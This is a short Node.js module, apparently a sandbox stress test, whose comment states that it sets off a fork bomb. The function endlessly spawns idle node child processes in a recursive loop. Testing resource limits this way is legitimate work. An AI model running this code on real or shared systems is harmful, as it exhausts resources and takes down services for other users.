/**
* Sets off a fork bomb, see the logs with `wt logs`
*/
var spawn = require('child_process').spawn;

module.exports = function (cb) {
  spawn_one();

  function spawn_one() {
      console.log('moaaar spawning')
      spawn('node', ['-e', 'setInterval(function () {}, 1000);']);
      process.nextTick(spawn_one);
  }
}
